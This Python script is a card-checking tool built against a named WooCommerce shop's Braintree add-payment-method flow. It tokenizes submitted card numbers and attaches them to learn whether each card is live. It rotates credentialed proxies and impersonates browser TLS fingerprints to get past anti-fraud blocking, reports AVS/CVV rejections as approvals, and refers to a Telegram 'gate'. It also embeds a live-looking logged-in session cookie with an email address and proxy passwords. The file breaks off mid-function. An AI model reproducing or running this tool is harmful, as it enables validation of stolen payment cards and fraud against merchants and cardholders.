#!/usr/bin/env python3
"""
kaffn8_check.py

Card checker for kaffn8.com (WooCommerce + Braintree).

WHEN COOKIES EXPIRE:
    Open DevTools on kaffn8.com -> Application -> Cookies -> kaffn8.com
    Select all the cookie rows, copy as one string, paste into
    PASTE_COOKIES_HERE below. Save. Run.

Each card run picks:
    - a random proxy from PROXIES  (rotates on retry)
    - a random browser profile from PROFILES (UA + sec-ch-ua + TLS)

If a proxy is blocked (HTTP 403/429) the run retries with a different proxy
up to MAX_PROXY_RETRIES times. Genuine declines return immediately.

Run:
    python3 kaffn8_check.py
    python3 kaffn8_check.py "5234650847692620|03|29|901"

Dependencies:
    pip install curl_cffi beautifulsoup4
"""

from __future__ import annotations

import argparse
import base64
import json
import random
import re
import sys
import time
import uuid
from dataclasses import dataclass
from typing import Optional
from urllib.parse import urlparse

from bs4 import BeautifulSoup
from curl_cffi import requests as creq
from curl_cffi.const import CurlHttpVersion


# ============================================================================
#  PASTE COOKIES HERE
# ============================================================================
#
# Copy the cookie header string from DevTools (the whole thing, all cookies),
# paste it between the triple-quotes. The script pulls out only the auth
# cookies it needs and ignores the tracking noise.

PASTE_COOKIES_HERE = """
sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-10-02%2006%3A17%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.kaffn8.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-10-02%2006%3A17%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.kaffn8.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; tk_ai=NncHUpj6jDnMW7k02PjuQEDf; mailchimp.cart.current_email=aadyaverma1063@email2.site; mailchimp_user_email=aadyaverma1063%40email2.site; mailchimp.cart.previous_email=aadyaverma1063@email2.site; sbjs_udata=vst%3D5%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2015%3B%20CPH2607%20Build%2FSP1A.210812.016%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F155.0.8059.43%20Mobile%20Safari%2F537.36; trustedsite_visit=1; trustedsite_tm_float_seen=1; wordpress_logged_in_b3d4ed68144466db26c1b91d4065fa54=aadyaverma1063%7C1793624861%7C9PtbAufyPDdQiaVIHI8STCHCtXNCF037m89khobtFdW%7C10a826b244f6093813b4273e8f071741b0ed35875a3baef358bfbf3c33630ff2; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.kaffn8.com%2Fmy-account%2Fpayment-methods%2F
"""


def parse_cookie_header(header: str) -> dict[str, str]:
    keep = {}
    for chunk in header.split(";"):
        chunk = chunk.strip()
        if not chunk or "=" not in chunk:
            continue
        name, _, value = chunk.partition("=")
        name, value = name.strip(), value.strip()
        if (name.startswith("wordpress_logged_in_")
                or name.startswith("wordpress_sec_")
                or name == "wordpress_test_cookie"):
            keep[name] = value
    return keep


COOKIES = parse_cookie_header(PASTE_COOKIES_HERE)


# ============================================================================
#  PROXIES
# ============================================================================
#
# Format: scheme://user:pass@host:port
# Special chars in passwords are URL-encoded (! = %21, & = %26, $ = %24).

PROXIES = [
    "http://3dfw7c6x:oSeqx0CNeV0k@103.183.121.128:58122",
    "http://azqdr5vn:71WCPuMwyc72@103.183.121.211:11657",
    "http://y7g4dd8d:Buw96jtGFKA5@103.183.121.59:34219",
    "http://zqrn9y5d:zQRN9y5d@103.156.91.173:58798",
    "http://dz46cabj:ksuRcKlNqJMU@103.161.113.230:18491",
    "http://RrkJjUqfT:jYEH6Emdg@82.117.94.14:63126",
    "http://1DnugnypC:4yPtzMd3f@193.254.17.97:64708",
    "http://nWtrJqsb:RYYEE72Y@194.33.9.114:64170",
    "http://nWtrJqsb:RYYEE72Y@194.33.9.136:49520",
    "http://oldg6k2r:oLdG6k2R@135.148.117.75:59813",
]


def proxy_for_curl(proxy_url: str) -> dict:
    return {"http": proxy_url, "https": proxy_url}


# ============================================================================
#  FINGERPRINT PROFILES
# ============================================================================
#
# Each profile bundles a UA string, sec-ch-ua header value, and a curl_cffi
# impersonate target. The impersonate target drives the TLS/HTTP2 fingerprint.

@dataclass(frozen=True)
class Profile:
    name: str
    impersonate: str
    ua: str
    ch_ua: str
    ch_ua_mobile: str
    ch_ua_platform: str
    accept_language: str


PROFILES = (
    Profile(
        name="chrome_win_120",
        impersonate="chrome120",
        ua=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36"),
        ch_ua='"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        ch_ua_mobile="?0",
        ch_ua_platform='"Windows"',
        accept_language="en-US,en;q=0.9",
    ),
    Profile(
        name="chrome_win_123",
        impersonate="chrome123",
        ua=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/123.0.0.0 Safari/537.36"),
        ch_ua='"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        ch_ua_mobile="?0",
        ch_ua_platform='"Windows"',
        accept_language="en-US,en;q=0.9",
    ),
    Profile(
        name="chrome_win_124",
        impersonate="chrome124",
        ua=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"),
        ch_ua='"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        ch_ua_mobile="?0",
        ch_ua_platform='"Windows"',
        accept_language="en-US,en;q=0.9",
    ),
    Profile(
        name="chrome_win_131",
        impersonate="chrome131",
        ua=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/131.0.0.0 Safari/537.36"),
        ch_ua='"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        ch_ua_mobile="?0",
        ch_ua_platform='"Windows"',
        accept_language="en-US,en;q=0.9",
    ),
    Profile(
        name="chrome_win_133",
        impersonate="chrome133a",
        ua=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/133.0.0.0 Safari/537.36"),
        ch_ua='"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        ch_ua_mobile="?0",
        ch_ua_platform='"Windows"',
        accept_language="en-US,en;q=0.9",
    ),
    Profile(
        name="chrome_win_136",
        impersonate="chrome136",
        ua=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/136.0.0.0 Safari/537.36"),
        ch_ua='"Chromium";v="136", "Not.A/Brand";v="24", "Google Chrome";v="136"',
        ch_ua_mobile="?0",
        ch_ua_platform='"Windows"',
        accept_language="en-US,en;q=0.9",
    ),
    Profile(
        name="chrome_mac_123",
        impersonate="chrome123",
        ua=("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/123.0.0.0 Safari/537.36"),
        ch_ua='"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        ch_ua_mobile="?0",
        ch_ua_platform='"macOS"',
        accept_language="en-US,en;q=0.9",
    ),
    Profile(
        name="chrome_mac_131",
        impersonate="chrome131",
        ua=("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/131.0.0.0 Safari/537.36"),
        ch_ua='"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        ch_ua_mobile="?0",
        ch_ua_platform='"macOS"',
        accept_language="en-US,en;q=0.9",
    ),
    Profile(
        name="chrome_linux_124",
        impersonate="chrome124",
        ua=("Mozilla/5.0 (X11; Linux x86_64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"),
        ch_ua='"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        ch_ua_mobile="?0",
        ch_ua_platform='"Linux"',
        accept_language="en-US,en;q=0.9",
    ),
    Profile(
        name="chrome_android_131",
        impersonate="chrome131_android",
        ua=("Mozilla/5.0 (Linux; Android 10; K) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/131.0.0.0 Mobile Safari/537.36"),
        ch_ua='"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        ch_ua_mobile="?1",
        ch_ua_platform='"Android"',
        accept_language="en-GB,en;q=0.9",
    ),
    Profile(
        name="chrome_android_136",
        impersonate="chrome131_android",
        ua=("Mozilla/5.0 (Linux; Android 14; Pixel 8) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/136.0.0.0 Mobile Safari/537.36"),
        ch_ua='"Chromium";v="136", "Not.A/Brand";v="24", "Google Chrome";v="136"',
        ch_ua_mobile="?1",
        ch_ua_platform='"Android"',
        accept_language="en-GB,en;q=0.9",
    ),
    Profile(
        name="edge_win_131",
        impersonate="edge101",
        ua=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"),
        ch_ua='"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        ch_ua_mobile="?0",
        ch_ua_platform='"Windows"',
        accept_language="en-US,en;q=0.9",
    ),
    Profile(
        name="safari_mac_17",
        impersonate="safari17_0",
        ua=("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) "
            "Version/17.0 Safari/605.1.15"),
        ch_ua='',
        ch_ua_mobile="",
        ch_ua_platform="",
        accept_language="en-US,en;q=0.9",
    ),
    Profile(
        name="safari_ios_17",
        impersonate="safari17_2_ios",
        ua=("Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) "
            "Version/17.2 Mobile/15E148 Safari/604.1"),
        ch_ua='',
        ch_ua_mobile="",
        ch_ua_platform="",
        accept_language="en-US,en;q=0.9",
    ),
)


def pick_profile() -> Profile:
    return random.choice(PROFILES)


# ============================================================================
#  CONFIG
# ============================================================================

SITE = "https://www.kaffn8.com"

MAX_PROXY_RETRIES = 5


# ============================================================================
#  CARD
# ============================================================================

@dataclass
class Card:
    number: str
    exp_month: str
    exp_year: str
    cvv: str

    @classmethod
    def parse(cls, raw: str) -> "Card":
        parts = re.split(r"[|:/ ]", raw.strip())
        if len(parts) != 4:
            raise ValueError("format: NUMBER|MM|YY|CVV")
        num, mm, yy, cvv = (p.strip() for p in parts)
        num = num.replace(" ", "").replace("-", "")
        if not num.isdigit() or not (13 <= len(num) <= 19):
            raise ValueError(f"bad card number: {num!r}")
        mm = mm.zfill(2)
        if not mm.isdigit() or not (1 <= int(mm) <= 12):
            raise ValueError(f"bad expiry month: {mm!r}")
        if len(yy) == 4:
            yy = yy[2:]
        if not yy.isdigit():
            raise ValueError(f"bad expiry year: {yy!r}")
        if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
            raise ValueError(f"bad cvv: {cvv!r}")
        return cls(num, mm, yy, cvv)


# ============================================================================
#  HTML helpers
# ============================================================================

def _soup(h: str) -> BeautifulSoup:
    return BeautifulSoup(h, "html.parser")


def _hidden(html: str, name: str) -> Optional[str]:
    n = _soup(html).find("input", {"name": name})
    return n.get("value") if n else None


def _json_field(html: str, field: str) -> Optional[str]:
    m = re.search(rf'["\']{re.escape(field)}["\']\s*:\s*["\']([^"\']+)["\']', html)
    return m.group(1) if m else None


def _wc_error(html: str) -> Optional[str]:
    b = _soup(html).find(class_=re.compile(
        r"woocommerce-error|wc-block-components-notice-banner__content"))
    return b.get_text(" ", strip=True)[:400] if b else None


def _wc_success(html: str) -> Optional[str]:
    b = _soup(html).find(class_=re.compile(
        r"woocommerce-message|wc-block-components-notice-banner__content"))
    return b.get_text(" ", strip=True)[:400] if b else None


def _bt_decline(html: str) -> Optional[str]:
    for pat in (
        r"Status code [A-Za-z0-9_]+:\s*[^<\"]+",
        r"Status code \d+:[^<\"]+",
        r"Gateway Rejected[^<\"]{0,200}",
        r"Reason:\s*([^<\"]+)",
        r"Declined[^<\"]{0,160}",
        r"CVV[^<\"]{0,120}",
        r"AVS[^<\"]{0,120}",
        r"risk_threshold[^<\"]{0,120}",
    ):
        m = re.search(pat, html)
        if m:
            return m.group(0).strip()[:400]
    return None


def _brand_from_bin(number: str) -> str:
    n = number.replace(" ", "").replace("-", "")
    if not n:
        return "visa"
    if n[0] == "4":
        return "visa"
    if n[:2] in {"34", "37"}:
        return "amex"
    if n[:4] == "6011" or n[:2] == "65":
        return "discover"
    try:
        p2 = int(n[:2])
        if 51 <= p2 <= 55:
            return "mastercard"
        p4 = int(n[:4])
        if 2221 <= p4 <= 2720:
            return "mastercard"
    except ValueError:
        pass
    return "visa"


# ============================================================================
#  RESPONSE MAPPER
# ============================================================================

_APPROVED_TOKENS = (
    "payment method added",
    "new payment method added",
    "payment method successfully added",
)

_APPROVED_GATEWAY_TOKENS = (
    "gateway rejected: avs",
    "gateway rejected: cvv",
    "gateway rejected: avs and cvv",
    "gateway rejected: avs/cvv",
    "gateway rejected: avs_cvv",
    "gateway rejected: postal code",
)

_APPROVED_AUTH_TOKENS = (
    "authorised",
    "authorized",
    "[1000]",
    "status code 1000",
)


def classify_response(raw: str) -> tuple[str, str]:
    low = re.sub(r"\s+", " ", raw.lower()).strip()

    for tok in _APPROVED_TOKENS:
        if tok in low:
            return "approved", "[1000] Authorised"

    for tok in _APPROVED_GATEWAY_TOKENS:
        if tok in low:
            return "approved", "[1000] Authorised"

    for tok in _APPROVED_AUTH_TOKENS:
        if tok in low:
            return "approved", "[1000] Authorised"

    if "risk_threshold" in low:
        return "declined", "Gateway Rejected: risk_threshold"

    if "gateway rejected" in low:
        m = re.search(r"gateway rejected[^<\"]{0,160}", raw, re.IGNORECASE)
        msg = m.group(0).strip() if m else "Gateway Rejected"
        return "declined", msg

    m = re.search(r"status code ([A-Za-z0-9_]+)\s*:\s*([^<\"]+)", raw, re.IGNORECASE)
    if m:
        code, reason = m.group(1), m.group(2).strip()
        if code == "1000":
            return "approved", "[1000] Authorised"
        return "declined", f"[{code}] {reason}"

    for tok in (
        "do not honor", "do not honour",
        "insufficient funds",
        "expired card",
        "invalid card",
        "invalid card number",
        "invalid expiry",
        "pick up card",
        "lost card",
        "stolen card",
        "restricted card",
        "card declined",
        "declined",
    ):
        if tok in low:
            m = re.search(rf"[^<\"]{{0,40}}{re.escape(tok)}[^<\"]{{0,120}}",
                          raw, re.IGNORECASE)
            msg = m.group(0).strip() if m else tok.title()
            return "declined", msg

    return "error", raw[:300] if raw else "unrecognized response"


# ============================================================================
#  HTTP SESSION
# ============================================================================

class Session:
    def __init__(self, profile: Profile, cookies: dict[str, str],
                 proxy_url: Optional[str] = None) -> None:
        self.profile = profile
        self.proxy_url = proxy_url

        session_kwargs: dict = {
            "impersonate": profile.impersonate,
            "http_version": CurlHttpVersion.V2_0,
            "timeout": 30,
            "allow_redirects": True,
        }
        if proxy_url:
            session_kwargs["proxies"] = proxy_for_curl(proxy_url)

        self.http = creq.Session(**session_kwargs)

        p = profile
        headers = {
            "User-Agent":         p.ua,
            "Accept-Language":    p.accept_language,
            "sec-gpc":            "1",
            "DNT":                "1",
            "Upgrade-Insecure-Requests": "1",
        }
        if p.ch_ua:
            headers["sec-ch-ua"] = p.ch_ua
        if p.ch_ua_mobile:
            headers["sec-ch-ua-mobile"] = p.ch_ua_mobile
        if p.ch_ua_platform:
            headers["sec-ch-ua-platform"] = p.ch_ua_platform

        self.http.headers.update(headers)

        for name, value in cookies.items():
            try:
                self.http.cookies.set(name, value, domain="www.kaffn8.com", path="/")
            except Exception:
                try:
                    self.http.cookies.set(name, value)
                except Exception:
                    continue

    def _nav(self, ref: Optional[str] = None) -> dict:
        h = {
            "Accept": ("text/html,application/xhtml+xml,application/xml;q=0.9,"
                       "image/avif,image/webp,image/apng,*/*;q=0.8,"
                       "application/signed-exchange;v=b3;q=0.7"),
            "Cache-Control": "max-age=0",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin" if ref else "none",
            "Sec-Fetch-User": "?1",
        }
        if ref:
            h["Referer"] = ref
        return h

    def _form(self, ref: str, ajax: bool = False) -> dict:
        h = {
            "Accept": ("*/*" if ajax
                       else "text/html,application/xhtml+xml,application/xml;q=0.9,"
                            "image/avif,image/webp,image/apng,*/*;q=0.8,"
                            "application/signed-exchange;v=b3;q=0.7"),
            "Content-Type": ("application/x-www-form-urlencoded; charset=UTF-8"
                             if ajax else "application/x-www-form-urlencoded"),
            "Origin": SITE,
            "Referer": ref,
            "Sec-Fetch-Dest": "empty" if ajax else "document",
            "Sec-Fetch-Mode": "cors" if ajax else "navigate",
            "Sec-Fetch-Site": "same-origin",
        }
        if ajax:
            h["X-Requested-With"] = "XMLHttpRequest"
        else:
            h["Sec-Fetch-User"] = "?1"
        return h

    def get(self, path: str, ref: Optional[str] = None) -> creq.Response:
        url = path if path.startswith("http") else SITE + path
        return self.http.get(url, headers=self._nav(ref))

    def post_form(self, path: str, data, ref: str, ajax: bool = False) -> creq.Response:
        url = path if path.startswith("http") else SITE + path
        return self.http.post(url, data=data, headers=self._form(ref, ajax))


# ============================================================================
#  RESULT
# ============================================================================

@dataclass
class CheckResult:
    status: str
    message: str
    raw: str
    elapsed: float
    proxy: str = ""
    profile: str = ""

    def to_dict(self) -> dict:
        return {
            "status":  self.status,
            "message": self.message,
            "raw":     self.raw,
            "elapsed": round(self.elapsed, 2),
            "proxy":   self.proxy,
            "profile": self.profile,
        }


class StepError(Exception):
    def __init__(self, message: str) -> None:
        super().__init__(message)
        self.message = message


# ============================================================================
#  CHECKER
# ============================================================================

class Checker:
    def __init__(self, cookies: dict[str, str]) -> None:
        self.cookies = cookies

    def run(self, card: Card) -> CheckResult:
        t_total = time.time()
        tried: set[str] = set()
        last: Optional[CheckResult] = None

        for attempt in range(1, MAX_PROXY_RETRIES + 1):
            proxy_url = self._pick_unused(tried)
            if proxy_url:
                tried.add(proxy_url)
            profile = pick_profile()

            res = self._run_once(card, profile, proxy_url)

            if res.status == "error" and self._is_retryable(res.message):
                last = res
                continue
            return res

        if last is not None:
            last.elapsed = round(time.time() - t_total, 2)
            return last
        return CheckResult("error", "all proxy attempts failed", "",
                           round(time.time() - t_total, 2))

    def _run_once(self, card: Card, profile: Profile,
                  proxy_url: Optional[str]) -> CheckResult:
        t0 = time.time()
        proxy_label = self._label_proxy(proxy_url)

        try:
            sess = Session(profile, self.cookies, proxy_url)
        except Exception as exc:
            return CheckResult(
                "error", f"session init: {type(exc).__name__}: {exc}",
                "", time.time() - t0, proxy_label, profile.name,
            )

        try:
            self._verify(sess)
            self._billing(sess)
            fp, add_url, woo_nonce = self._client_token(sess)
            payment_nonce = self._tokenize(card, fp, profile, proxy_url)
            raw = self._attach(sess, add_url, woo_nonce, payment_nonce, card)
            status, message = classify_response(raw)
            return CheckResult(status, message, raw, time.time() - t0,
                               proxy_label, profile.name)
        except StepError as exc:
            return CheckResult("error", exc.message, "", time.time() - t0,
                               proxy_label, profile.name)
        except Exception as exc:
            return CheckResult("error", f"{type(exc).__name__}: {exc}", "",
                               time.time() - t0, proxy_label, profile.name)
        finally:
            try:
                sess.http.close()
            except Exception:
                pass

    @staticmethod
    def _pick_unused(tried: set[str]) -> Optional[str]:
        available = [p for p in PROXIES if p not in tried]
        if not available:
            available = list(PROXIES)
        return random.choice(available) if available else None

    @staticmethod
    def _is_retryable(message: str) -> bool:
        low = message.lower()
        return any(tok in low for tok in (
            "http 403",
            "http 429",
            "http 407",
            "http 502",
            "http 503",
            "http 504",
            "connection",
            "timeout",
            "timed out",
            "proxy",
            "ssl",
            "reset",
            "refused",
            "unreachable",
            "resolve",
            "session init",
        ))

    @staticmethod
    def _label_proxy(proxy_url: Optional[str]) -> str:
        if not proxy_url:
            return "none"
        try:
            u = urlparse(proxy_url)
            return f"{u.hostname}:{u.port}"
        except Exception:
            return "?"

    # -- steps -----------------------------------------------------------

    def _verify(self, sess: Session) -> None:
        r = sess.get("/my-account/")
        if r.status_code == 403:
            raise StepError("login page HTTP 403 — proxy blocked")
        if r.status_code == 429:
            raise StepError("login page HTTP 429 — rate limited")
        if r.status_code != 200:
            raise StepError(f"login page HTTP {r.status_code}")
        if "woocommerce-MyAccount-navigation" not in r.text:
            raise StepError("cookies expired or invalid — refresh the PASTE_COOKIES_HERE block")

    def _billing(self, sess: Session) -> None:
        r = sess.get("/my-account/edit-address/billing/",
                     ref=SITE + "/my-account/edit-address/")
        if r.status_code in (403, 429):
            raise StepError(f"billing page HTTP {r.status_code} — proxy blocked")
        nonce = _hidden(r.text, "woocommerce-edit-address-nonce")
        if not nonce:
            raise StepError("edit-address nonce not found")

        current: dict[str, str] = {}
        for name in ("billing_first_name", "billing_last_name", "billing_company",
                     "billing_country", "billing_address_1", "billing_address_2",
                     "billing_city", "billing_state", "billing_postcode",
                     "billing_email"):
            el = _soup(r.text).find("input", {"name": name})
            if el and el.get("value"):
                current[name] = el["value"]

        data = {
            "billing_first_name": current.get("billing_first_name") or "Oggy",
            "billing_last_name":  current.get("billing_last_name")  or "Master",
            "billing_company":    current.get("billing_company")    or "P",
            "billing_country":    current.get("billing_country")    or "US",
            "billing_address_1":  current.get("billing_address_1")  or "Street 24",
            "billing_address_2":  current.get("billing_address_2")  or "Street 24",
            "billing_city":       current.get("billing_city")       or "New York",
            "billing_state":      current.get("billing_state")      or "NY",
            "billing_postcode":   current.get("billing_postcode")   or "10080",
            "billing_phone":      "",
            "billing_email":      current.get("billing_email")      or "",
            "save_address":       "Save address",
            "woocommerce-edit-address-nonce": nonce,
            "_wp_http_referer":   "/my-account/edit-address/billing/",
            "action":             "edit_address",
        }
        sess.post_form("/my-account/edit-address/billing/", data,
                       ref=SITE + "/my-account/edit-address/billing/")

    def _client_token(self, sess: Session) -> tuple[str, str, str]:
        r = sess.get("/my-account/add-payment-method/",
                     ref=SITE + "/my-account/payment-methods/")
        if r.status_code in (403, 429):
            raise StepError(f"add-payment-method HTTP {r.status_code} — proxy blocked")
        if r.status_code != 200:
            raise StepError(f"add-payment-method HTTP {r.status_code}")

        woo_nonce = _hidden(r.text, "woocommerce-add-payment-method-nonce")
        client_nonce = _json_field(r.text, "client_token_nonce")
        if not client_nonce:
            raise StepError("client_token_nonce not found")

        r2 = sess.post_form(
            "/wp-admin/admin-ajax.php",
            {"action": "wc_braintree_credit_card_get_client_token",
             "nonce":  client_nonce},
            ref=SITE + "/my-account/add-payment-method/",
            ajax=True,
        )
        if r2.status_code in (403, 429):
            raise StepError(f"admin-ajax HTTP {r2.status_code} — proxy blocked")

        try:
            payload = r2.json()
        except Exception:
            raise StepError("client token: non-json response")

        raw = payload.get("data")
        if isinstance(raw, dict):
            raw = raw.get("clientToken") or raw.get("token")
        if not isinstance(raw, str) or not raw:
            raise StepError("client token: unexpected payload")

        fp = self._extract_fingerprint(raw)
        if not fp:
            raise StepError("client token: no authorizationFingerprint")

        return fp, SITE + "/my-account/add-payment-method/", woo_nonce

    @staticmethod
    def _extract_fingerprint(token: str) -> Optional[str]:
        padded = token + "=" * (-len(token) % 4)
        for dec in (base64.b64decode, base64.urlsafe_b64decode):
            try:
                d = json.loads(dec(padded).decode("utf-8", "ignore"))
                fp = d.get("authorizationFingerprint")
                if fp:
                    return fp
            except Exception:
                continue
        m = re.search(r'authorizationFingerprint["\']?\s*[:=]\s*["\']([^"\']+)', token)
        return m.group(1) if m else None

    def _tokenize(self, card: Card, fingerprint: str,
                  profile: Profile, proxy_url: Optional[str]) -> str:
        headers = {
            "Accept": "*/*",
            "Accept-Language": profile.accept_language,
            "Authorization": f"Bearer {fingerprint}",
            "Braintree-Version": "2018-05-10",
            "Content-Type": "application/json",
            "Origin": "https://assets.braintreegateway.com",
            "Referer": "https://assets.braintreegateway.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": profile.ua,
        }
        if profile.ch_ua:
            headers["sec-ch-ua"] = profile.ch_ua
        if profile.ch_ua_mobile:
            headers["sec-ch-ua-mobile"] = profile.ch_ua_mobile
        if profile.ch_ua_platform:
            headers["sec-ch-ua-platform"] = profile.ch_ua_platform

        query = (
            "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {"
            "  tokenizeCreditCard(input: $input) { token"
            "    creditCard { bin brandCode last4 expirationMonth expirationYear } } }"
        )
        body = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": str(uuid.uuid4()),
            },
            "query": query,
            "variables": {"input": {
                "creditCard": {
                    "number": card.number,
                    "expirationMonth": card.exp_month,
                    "expirationYear": "20" + card.exp_year,
                    "cvv": card.cvv,
                },
                "options": {"validate": False},
            }},
            "operationName": "TokenizeCreditCard",
        }

        post_kwargs: dict = {
            "headers": headers,
            "json": body,
            "impersonate": profile.impersonate,
            "http_version": CurlHttpVersion.V2_0,
            "timeout": 30,
        }
        if proxy_url:
            post_kwargs["proxies"] = proxy_for_curl(proxy_url)

        try:
            r = creq.post("https://payments.braintree-api.com/graphql", **post_kwargs)
        except Exception as exc:
            raise StepError(f"tokenize transport: {type(exc).__name__}: {exc}")

        try:
            data = r.json()
        except Exception:
            raise StepError("tokenize: non-json response")

        tcc = (data.get("data") or {}).get("tokenizeCreditCard") or {}
        token = tcc.get("token")
        if not token:
            errs = data.get("errors") or data.get("error")
            raise StepError(f"tokenize: {errs or 'no token in response'}")
        return token

    def _attach(self, sess: Session, add_url: str, woo_nonce: Optional[str],
                payment_nonce: str, card: Card) -> str:
        if not woo_nonce:
            raise StepError("attach: missing woocommerce-add-payment-method-nonce")

        device = json.dumps({"correlation_id": str(uuid.uuid4())[:32]})
        brand = _brand_from_bin(card.number)

        data = [
            ("payment_method",                                 "braintree_credit_card"),
            ("wc-braintree-credit-card-card-type",             brand),
            ("wc-braintree-credit-card-3d-secure-enabled",     ""),
            ("wc-braintree-credit-card-3d-secure-verified",    ""),
            ("wc-braintree-credit-card-3d-secure-order-total", "0.00"),
            ("wc_braintree_credit_card_payment_nonce",         payment_nonce),
            ("wc_braintree_device_data",                       device),
            ("wc-braintree-credit-card-tokenize-payment-method", "true"),
            ("wc_braintree_paypal_payment_nonce",              ""),
            ("wc-braintree-paypal-context",                    "shortcode"),
            ("wc_braintree_paypal_amount",                     "0.00"),
            ("wc-braintree-paypal_currency",                   "USD"),
            ("wc-braintree-paypal-locale",                     "en_us"),
            ("wc-braintree-paypal-tokenize-payment-method",    "true"),
            ("woocommerce-add-payment-method-nonce",           woo_nonce),
            ("_wp_http_referer",                               "/my-account/add-payment-method/"),
            ("woocommerce_add_payment_method",                 "1"),
        ]
        r = sess.post_form("/my-account/add-payment-method/", data, ref=add_url)
        if r.status_code in (403, 429):
            raise StepError(f"attach HTTP {r.status_code} — proxy blocked")

        html = r.text
        low = html.lower()

        if any(tok in low for tok in (
            "payment method added",
            "new payment method added",
            "payment method successfully added",
        )):
            return html

        notice = _wc_error(html) or _bt_decline(html)
        if notice:
            return notice

        r2 = sess.get("/my-account/payment-methods/", ref=SITE + "/my-account/")
        succ2 = _wc_success(r2.text)
        if succ2 and "payment method" in succ2.lower():
            return succ2
        err2 = _wc_error(r2.text)
        if err2:
            return err2

        return html


# ============================================================================
#  PROGRAMMATIC ENTRY POINT
# ============================================================================
#
# Used by the Telegram gate (gates/b3.py) instead of the old remote endpoint.
# Mirrors gates/chase.py::run_check: takes "CC|MM|YY|CVV", returns a dict, and
# never raises. Blocking (curl_cffi + proxy retries) -- call via to_thread.

def run_check(card_string: str) -> dict:
    """
    Run the full kaffn8 -> Braintree add-payment-method pipeline for one card.

    card_string format: "cc|mm|yy|cvv"
    """
    started = time.time()

    try:
        card = Card.parse(card_string)
    except ValueError as exc:
        return {
            "status": "ERROR",
            "raw_status": "ERROR",
            "response": f"Invalid card format: {exc}",
            "message": f"Invalid card format: {exc}",
            "raw": "",
            "elapsed": round(time.time() - started, 2),
            "proxy": "",
            "profile": "",
        }

    try:
        result = Checker(COOKIES).run(card)
    except Exception as exc:
        return {
            "status": "ERROR",
            "raw_status": "ERROR",
            "response": f"{type(exc).__name__}: {exc}",
            "message": f"{type(exc).__name__}: {exc}",
            "raw": "",
            "elapsed": round(time.time() - started, 2),
            "proxy": "",
            "profile": "",
        }

    status = (result.status or "error").upper()
    if status not in ("APPROVED", "DECLINED", "LIVE", "DEAD"):
        status = "ERROR"

    return {
        "status":     status,
        "raw_status": status,
